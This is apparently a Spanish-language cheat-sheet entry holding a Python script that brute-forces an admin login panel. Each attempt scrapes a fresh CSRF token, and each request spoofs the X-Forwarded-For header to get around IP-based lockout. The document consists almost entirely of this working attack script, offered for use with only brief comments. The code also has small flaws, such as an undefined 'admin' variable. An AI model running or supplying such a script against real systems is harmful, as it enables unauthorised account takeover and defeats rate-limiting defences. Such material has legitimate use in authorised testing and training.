# Login con CSRF Token 

Tags: #Python3 #CSRF #Login 

```bash 
# Este script sirve para hacer 'Fuerza bruta' a un panel de login en donde tendremos que usar un 'CSRF Token' dinamico, ademas de, cambiar la IP para evitar el bloqueo. 
```

```python
#!/usr/bin/env python3 

from pwn import *
import requests, pdb, signal , sys, time , re

def def_handler(sig, frame):
	print("\n\n[!] Saliendo...\n")
	sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
main_url = "http://IP/admin/login"

def brute_force():
	s = requests.session()
	f = open("diccionary.txt", "r")   # Abrimos el archivo de passwords 
	p1 = log.progress("Fuerza bruta")
	p1.status("Iniciando ataque de fuerza bruta")
	time.sleep(2)
	counter = 1 
	
	for password in f.readlines():
		password = password.strip('\n')   # Quitamos el salto de linea que agrega automaticamente 
		p1.status("Probando la password [%d/349]: %s" % (counter,password))
		r = s.get(main_url)
		token = re.findall(r'name="tokenCSRF" value="(.*?)"', r.text)[0]
		post_data = {
			'tokenCSRF': token,
			'username': admin,
			'password': '%s' % password,
			'save': ''
		} 
		
		headers = {
			'X-Forwarded-For': '%s' % password  # Agregar la cabecera para cambiar la IP por una palabra
		}

		r = s.post(main_url, data=post_data, headers=headers)
		counter += 1

		if "Username or password incorrect" not in r.text:
			p1.success("La password es -> %s" % password)
			break

if __name__ == '__main__':
	brute_force()

```